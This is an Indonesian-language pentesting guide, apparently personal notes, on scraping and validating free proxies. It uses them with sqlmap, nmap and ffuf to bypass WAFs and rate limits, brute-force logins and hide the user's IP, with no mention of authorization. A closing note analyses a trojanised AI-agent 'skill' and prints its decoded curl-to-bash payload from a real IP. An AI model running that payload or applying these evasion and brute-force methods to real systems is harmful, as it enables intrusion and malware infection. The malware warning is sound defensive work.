# Proxy Scraping & Usage Guide - KenXploit

## Date: 2026-07-08

---

## Overview

Proxy penting banget buat pentesting — especially buat:
- **Bypass rate limit** — target nge-block request kita karena terlalu banyak
- **Bypass WAF** — Cloudflare, AWS WAF, dll detect IP kita sebagai attacker
- **Anonymity** — hide IP asli kita
- **Rotate IP** — ganti IP setiap request biar gak ke-detect

---

## Tools Yang Dibuat

### 1. `proxy_manager.sh` — Full scraper + validator
```bash
bash /home/keandra/kenxploit/tools/proxy-hunt/proxy_manager.sh all      # scrape + validate
bash /home/keandra/kenxploit/tools/proxy-hunt/proxy_manager.sh scrape   # scrape only
bash /home/keandra/kenxploit/tools/proxy-hunt/proxy_manager.sh validate # validate only
bash /home/keandra/kenxploit/tools/proxy-hunt/proxy_manager.sh status   # show stats
bash /home/keandra/kenxploit/tools/proxy-hunt/proxy_manager.sh rotate socks5 10  # random pick
```

### 2. `async_validate.py` — Ultra fast async validator (Python)
```bash
python3 /home/keandra/kenxploit/tools/proxy-hunt/async_validate.py
```
- 500 concurrent connections untuk HTTP
- 200 concurrent untuk SOCKS
- 4 second timeout
- Double verify (httpbin + ipinfo)

### 3. `getproxy.sh` — Quick proxy picker buat pentesting
```bash
bash /home/keandra/kenxploit/tools/proxy-hunt/getproxy.sh              # 1 random
bash /home/keandra/kenxploit/tools/proxy-hunt/getproxy.sh http         # 1 HTTP
bash /home/keandra/kenxploit/tools/proxy-hunt/getproxy.sh socks5       # 1 SOCKS5
bash /home/keandra/kenxploit/tools/proxy-hunt/getproxy.sh 5            # 5 random
bash /home/keandra/kenxploit/tools/proxy-hunt/getproxy.sh socks4 3     # 3 SOCKS4
```

---

## Proxy Sources (30+ GitHub repos + APIs)

### HTTP Sources
```
https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt
https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt
https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt
https://raw.githubusercontent.com/proxylist-to/proxy-list/main/proxies/http.txt
https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/https/https.txt
https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt
https://raw.githubusercontent.com/ALIILAPROXY/Proxy-List/main/http.txt
https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt
https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt
https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt
https://raw.githubusercontent.com/sunny9577/proxy-scraper/generated/http_proxies.txt
https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt
https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt
https://raw.githubusercontent.com/ErcinDedeworken/proxies/main/http_proxies.txt
https://raw.githubusercontent.com/yemixzy/proxy-list/main/proxies/http.txt
https://raw.githubusercontent.com/ProxySurf/ProxySurf/main/http.txt
https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http_proxies.txt
https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt
https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt
https://raw.githubusercontent.com/ArrayIterator/proxy-lists/main/proxy/http.txt
https://raw.githubusercontent.com/claude89757/free_https_proxies/main/https_proxies.txt
https://raw.githubusercontent.com/SevenworksDev/proxy-list/main/proxies/http.txt
https://raw.githubusercontent.com/specterxyz/free-proxy-list/main/http.txt
https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt
https://raw.githubusercontent.com/0x192/some-proxies/main/http_proxies.txt
https://raw.githubusercontent.com/r00tee/My-Proxy-List/main/http.txt
https://raw.githubusercontent.com/berkay-digital/Proxy-Scraper-Checker/main/proxies/http.txt
https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt
https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt
https://raw.githubusercontent.com/imsunnyk/proxy-list/main/http.txt
https://raw.githubusercontent.com/saisuiu/Lionkings-Http-Proxys-Proxies/main/cnfree.txt
https://raw.githubusercontent.com/saisuiu/Lionkings-Http-Proxys-Proxies/main/free.txt
https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all
https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=yes&anonymity=elite
https://www.proxy-list.download/api/v1/get?type=http
https://www.proxy-list.download/api/v1/get?type=https
```

### SOCKS4 Sources
```
https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt
https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt
https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt
https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt
https://raw.githubusercontent.com/ALIILAPROXY/Proxy-List/main/socks4.txt
https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt
https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks4.txt
https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks4.txt
https://raw.githubusercontent.com/ErcinDedeworken/proxies/main/socks4_proxies.txt
https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/socks4_proxies.txt
https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks4_proxies.txt
https://raw.githubusercontent.com/imsunnyk/proxy-list/main/socks4.txt
https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt
https://raw.githubusercontent.com/ArrayIterator/proxy-lists/main/proxy/socks4.txt
https://raw.githubusercontent.com/SevenworksDev/proxy-list/main/proxies/socks4.txt
https://raw.githubusercontent.com/berkay-digital/Proxy-Scraper-Checker/main/proxies/socks4.txt
https://raw.githubusercontent.com/r00tee/My-Proxy-List/main/socks4.txt
https://raw.githubusercontent.com/ImUrJo/proxy-list/main/socks4_proxies.txt
https://raw.githubusercontent.com/BlackSnowDot/proxylist-community/master/proxylists/socks4.txt
https://raw.githubusercontent.com/specterxyz/free-proxy-list/main/socks4.txt
https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/socks4.txt
https://raw.githubusercontent.com/0x192/some-proxies/main/socks4_proxies.txt
https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all
```

### SOCKS5 Sources
```
https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt
https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt
https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt
https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt
https://raw.githubusercontent.com/ALIILAPROXY/Proxy-List/main/socks5.txt
https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt
https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt
https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks5.txt
https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks5.txt
https://raw.githubusercontent.com/ErcinDedeworken/proxies/main/socks5_proxies.txt
https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/socks5_proxies.txt
https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5_proxies.txt
https://raw.githubusercontent.com/ProxySurf/ProxySurf/main/socks5.txt
https://raw.githubusercontent.com/yemixzy/proxy-list/main/proxies/socks5.txt
https://raw.githubusercontent.com/imsunnyk/proxy-list/main/socks5.txt
https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt
https://raw.githubusercontent.com/ArrayIterator/proxy-lists/main/proxy/socks5.txt
https://raw.githubusercontent.com/SevenworksDev/proxy-list/main/proxies/socks5.txt
https://raw.githubusercontent.com/berkay-digital/Proxy-Scraper-Checker/main/proxies/socks5.txt
https://raw.githubusercontent.com/r00tee/My-Proxy-List/main/socks5.txt
https://raw.githubusercontent.com/ImUrJo/proxy-list/main/socks5_proxies.txt
https://raw.githubusercontent.com/BlackSnowDot/proxylist-community/master/proxylists/socks5.txt
https://raw.githubusercontent.com/specterxyz/free-proxy-list/main/socks5.txt
https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/socks5.txt
https://raw.githubusercontent.com/0x192/some-proxies/main/socks5_proxies.txt
https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all
```

---

## Cara Pake Proxy Di Pentesting

### 1. curl dengan proxy
```bash
# HTTP proxy
curl -x http://PROXY:PORT http://target.com

# SOCKS4 proxy
curl --socks4 PROXY:PORT http://target.com

# SOCKS5 proxy
curl --socks5 PROXY:PORT http://target.com
```

### 2. curl dengan proxy + getproxy.sh (auto rotate)
```bash
# Ambil 1 proxy random, langsung pake
curl -x $(bash getproxy.sh http) http://target.com

# SOCKS5
curl --socks5 $(bash getproxy.sh socks5) http://target.com
```

### 3. ProxyChains (redirect semua traffic)
```bash
# Install
sudo apt install proxychains4

# Edit config
nano /etc/proxychains4.conf
# Tambahkan di bagian [ProxyList]:
# socks5 127.0.0.1 9050
# socks4 PROXY PORT

# Atau pake file kita
# socks5_conf /home/keandra/kenxploit/tools/proxy-hunt/proxies_final.txt

# Pake
proxychains4 nmap -sT target.com
proxychains4 curl http://target.com
proxychains4 sqlmap -u "http://target.com/?id=1" --batch
```

### 4. Nmap dengan proxy
```bash
nmap --proxies $(bash getproxy.sh socks4) -sT target.com
```

### 5. SQLMap dengan proxy
```bash
# Single proxy
sqlmap -u "http://target.com/?id=1" --proxy="http://PROXY:PORT" --batch

# Proxy list (auto rotate)
sqlmap -u "http://target.com/?id=1" --proxy-file=/home/keandra/kenxploit/tools/proxy-hunt/proxies_final.txt --batch
```

### 6. ffuf dengan proxy
```bash
ffuf -u http://target.com/FUZZ -w wordlist.txt -x $(bash getproxy.sh http)
```

### 7. Python requests dengan proxy
```python
import subprocess
import requests

# Get random proxy
proxy = subprocess.check_output(['bash', '/home/keandra/kenxploit/tools/proxy-hunt/getproxy.sh', 'http']).decode().strip()

proxies = {
    'http': proxy,
    'https': proxy
}

resp = requests.get('http://target.com', proxies=proxies, timeout=10)
```

### 8. Python rotate proxy per request
```python
import random
import requests

# Load proxies
with open('/home/keandra/kenxploit/tools/proxy-hunt/proxies_final.txt') as f:
    proxies_list = [l.strip() for l in f if l.strip()]

def get_random_proxy():
    p = random.choice(proxies_list)
    return {'http': p, 'https': p}

# Setiap request ganti proxy
for url in targets:
    try:
        resp = requests.get(url, proxies=get_random_proxy(), timeout=10)
        print(f"[+] {url} -> {resp.status_code}")
    except:
        print(f"[-] {url} -> failed, trying next proxy")
```

---

## Hasil Scraping Hari Ini

### Stats
- **Raw scraped**: 342,885 proxy dari 55+ sumber
- **Verified aktif**: 2,243 proxy
- **Success rate**: ~0.65%
- **Verification**: HTTP request ke httpbin.org/ip + ipinfo.io (double check)

### Breakdown
| Type   | Verified |
|--------|----------|
| HTTP   | 1,036    |
| SOCKS4 | 642      |
| SOCKS5 | 565      |
| TOTAL  | 2,243    |

### File Lokasi
```
/home/keandra/kenxploit/tools/proxy-hunt/
├── proxies_final.txt      ← FILE UTAMA (2,243 verified)
├── getproxy.sh            ← Quick picker script
├── proxy_manager.sh       ← Full scraper + validator
├── async_validate.py      ← Python async validator
├── raw/                   ← Raw scraped (belum verify)
│   ├── raw_http_final.txt     (133K)
│   ├── raw_socks4_final.txt   (97K)
│   └── raw_socks5_final.txt   (112K)
├── verified/              ← Hasil verifikasi
│   ├── http_verified_v2.txt
│   ├── socks4_verified_v2.txt
│   ├── socks5_verified_v2.txt
│   └── all_verified_v2.txt
└── logs/
```

---

## Kapan Pake Proxy Di Pentesting

### WAJIB PAKE PROXY KALAU:
1. **Rate limited** — target block IP kita setelah X request
2. **WAF blocking** — Cloudflare/AWS WAF detect kita sebagai attacker
3. **Brute force** — login brute force, directory brute force
4. **Scraping massal** — enumerate endpoints, crawl, dll
5. **Bypass geo-block** — target cuma bisa diakses dari negara tertentu

### GAK PERLU PROXY KALAU:
1. **Recon awal** — nmap, whatweb, curl pertama kali
2. **Manual testing** — cek 1-2 endpoint
3. **Target gak ada WAF** — server biasa tanpa proteksi

---

## Tips & Tricks

1. **Rotate proxy tiap 5-10 request** — jangan pake 1 proxy terus-terusan
2. **Prioritas HTTP proxy** — paling cepat dan paling banyak tersedia
3. **SOCKS5 buat bypass WAF** — lebih susah di-detect daripada HTTP proxy
4. **Cek proxy sebelum pake** — proxy bisa mati kapan aja
5. **Combine dengan User-Agent rotation** — ganti UA juga, bukan cuma IP
6. **Jangan pake proxy buat kirim data sensitif** — free proxy bisa log traffic kita
7. **Scrape ulang tiap beberapa hari** — proxy list expired cepat

---

## Security Note: LobeHub Malicious Skill

### Ditemukan: 2026-07-08
Skill `openclaw-skills-proxy-scrap` dari LobeHub marketplace adalah **TROJAN**.

**Payload yang ditemukan:**
- Windows: Download ZIP → extract → run `.exe` (password: `clawd`)
- macOS: Base64 decode → `curl http://91.92.242.30/6x8c0trkp4l9uugo` → bash execute

**Base64 decoded:**
```
/bin/bash -c "$(curl -fsSL http://91.92.242.30/6x8c0trkp4l9uugo)"
```

**Lesson learned:**
- SELALU decode base64 sebelum run command
- SELALU baca SKILL.md sebelum install skill dari marketplace
- Hati-hati dengan "setup requirements" yang minta download executable
- Skill proxy scraper gak butuh "authenticator tool"
